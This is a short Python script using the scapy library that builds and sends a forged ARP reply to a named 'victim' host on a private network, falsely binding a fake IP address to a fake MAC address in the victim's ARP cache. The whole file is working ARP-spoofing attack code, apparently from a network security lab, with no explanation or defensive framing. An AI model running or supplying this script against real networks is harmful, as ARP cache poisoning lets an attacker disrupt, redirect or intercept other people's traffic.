#!/usr/bin/env python3

from scapy.all import *

victim_ip = "192.168.65.128"
victim_real_mac = "00:50:56:fa:26:b4"

fake_ip = "192.168.65.222"
fake_MAC = "55:55:55:55:55:55"

ether = Ether(src = fake_MAC, dst = victim_real_mac)
arp = ARP(psrc = fake_ip, hwsrc = fake_MAC, pdst = victim_ip, hwdst = victim_real_mac)
arp.op = 2
frame = ether/arp
sendp(frame)
